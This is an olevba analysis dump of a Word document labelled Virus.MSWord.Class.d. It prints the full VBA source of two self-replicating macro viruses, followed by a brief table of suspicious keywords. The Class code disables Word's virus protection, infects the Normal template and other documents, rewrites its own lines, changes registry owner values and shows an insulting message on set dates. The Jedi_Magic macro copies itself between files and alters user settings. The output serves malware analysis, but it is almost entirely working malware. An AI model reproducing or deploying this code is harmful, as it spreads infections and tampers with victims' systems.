olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-e99118e365bb7bbcf6ea29c3133ad49c9c07d632
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-e99118e365bb7bbcf6ea29c3133ad49c9c07d632 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Const REG_SZ As Long = 1
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Const HKEY_CURRENT_USER As Long = &H80000001
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Sub AutoOpen()
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
On Error GoTo out
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Options.VirusProtection = False
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Options.SaveNormalPrompt = False
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Options.ConfirmConversions = False
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
If nt > 70 And ad > 0 Then GoTo out
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
If nt < 70 Then
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
End If
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
host.codemodule.AddFromFile ("c:\class.sys")
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
With host.codemodule
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    For x = 1 To 16
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    .deletelines 1
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    Next x
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
End With
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
If nt < 70 Then
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    With host.codemodule
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    .replaceline 1, "Sub AutoClose()"
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    .replaceline 91, "Sub ToolsMacro()"
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    For x = 70 To 81
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
        .deletelines 62
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    Next x
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    .replaceline 35, "    For x = 1 To 4"
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    End With
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
End If
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
If nt < 70 Then
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
u = RegCloseKey(k)
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
End If
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
With host.codemodule
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    For x = 2 To 104 Step 2
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
    Next x
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
End With
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
out:
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
End Sub
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
Sub ViewVBCode()
'Andres Bonifacio3/11/99 2:13:12 PMHP LaserJet 4L on \\STATION11\HPmicroprocessors
End Sub
-------------------------------------------------------------------------------
VBA MACRO Jedi_Magic.bas 
in file: Virus.MSWord.Class.d-e99118e365bb7bbcf6ea29c3133ad49c9c07d632 - OLE stream: 'Macros/VBA/Jedi_Magic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro created 03/12/98 by Membership & Registry Division"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.Jedi_Magic.AutoOpen"
Options.VirusProtection = False
If Application.UserInitials <> "OBC" Then
    Application.OrganizerCopy Source:= _
    ActiveDocument.FullName, Destination:= _
    NormalTemplate.FullName, Name:="Jedi_Magic", _
    Object:=wdOrganizerObjectProjectItems
    NormalTemplate.Save
    Application.UserName = "O.B.1. Canobi"
    Application.UserInitials = "OBC"
    Application.UserAddress = "BOOGZI BARBERS ... Food Buster!!!"
End If
For Each aVar In ActiveDocument.Variables
    If aVar.Name = "Force" Then num = aVar.Index
Next aVar
If num = 0 Then
    Application.OrganizerCopy Source:= _
    NormalTemplate.FullName, Destination:= _
    ActiveDocument.FullName, Name:="Jedi_Magic", _
    Object:=wdOrganizerObjectProjectItems
    ActiveDocument.Variables.Add Name:="Force", Value:="567374-Joseph.A.D.G."
    ActiveDocument.Save
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

